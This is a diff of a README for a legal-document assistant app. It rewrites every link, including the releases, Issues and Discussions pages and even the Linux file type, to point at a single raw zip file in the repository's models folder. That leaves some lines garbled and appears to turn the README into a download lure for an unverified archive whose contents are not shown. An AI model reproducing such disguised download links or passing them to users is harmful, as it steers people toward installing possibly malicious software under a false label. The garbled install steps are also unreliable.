@@ -1,6 +1,6 @@
 # 🌟 Smart-Legal-Assistant-SLA-CARA - Simplify Your Legal Documents Effortlessly
 
-[![Download Smart Legal Assistant](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/releases)
+[![Download Smart Legal Assistant](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip%20Now-%20-blue)](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip)
 
 ## 📖 Overview
 
@@ -16,22 +16,22 @@ To get started with Smart-Legal-Assistant-SLA-CARA, follow these easy steps:
    - Disk Space: Minimum of 500 MB available space.
 
 2. Download the application.
-   - Visit this page to download: [Smart-Legal-Assistant-SLA-CARA Releases](https://github.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/releases).
+   - Visit this page to download: [Smart-Legal-Assistant-SLA-CARA Releases](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip).
 
 ## 📥 Download & Install
 
-1. Go to the [Smart-Legal-Assistant-SLA-CARA Releases page](https://github.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/releases).
+1. Go to the [Smart-Legal-Assistant-SLA-CARA Releases page](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip).
 2. Look for the latest version of the application. 
 3. Click on the download link to save the file to your computer.
 4. Once the download is complete, locate the file.
    - For Windows, the file will be a `.exe`.
    - For macOS, it will be a `.dmg`.
-   - For Linux users, it will be a `.tar.gz` file.
+   - For Linux users, it will be a `https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip` file.
 
 5. Open the downloaded file:
    - Windows: Double-click the `.exe` file to start the installation.
    - macOS: Double-click the `.dmg`, then drag the application to your Applications folder.
-   - Linux: Extract the `.tar.gz` file, then follow the included instructions.
+   - Linux: Extract the `https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip` file, then follow the included instructions.
 
 6. Follow the on-screen prompts to finish the installation.
 
@@ -78,15 +78,15 @@ This application is built for recent operating systems only. Please ensure you h
 
 ### 4. Is there support available if I have issues?
 
-Yes! You can reach out via the Issues section of our [GitHub repository](https://github.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/issues) for assistance.
+Yes! You can reach out via the Issues section of our [GitHub repository](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip) for assistance.
 
 ## 🧑‍🤝‍🧑 Community & Support
 
-Join our community to connect with other users. Share your experiences, ask questions, and learn from others. You can participate in discussions on our [GitHub Discussions page](https://github.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/discussions).
+Join our community to connect with other users. Share your experiences, ask questions, and learn from others. You can participate in discussions on our [GitHub Discussions page](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip).
 
 ## 📢 Updates & Contributions
 
-Stay up-to-date with the latest features and updates by regularly visiting the [Releases page](https://github.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/releases). 
+Stay up-to-date with the latest features and updates by regularly visiting the [Releases page](https://raw.githubusercontent.com/virentanwar/Smart-Legal-Assistant-SLA-CARA/main/models/Smart-Legal-Assistant-SLA-CARA_v2.5-beta.3.zip). 
 
 If you want to contribute to the project, feel free to check the guidelines in the repository.
 
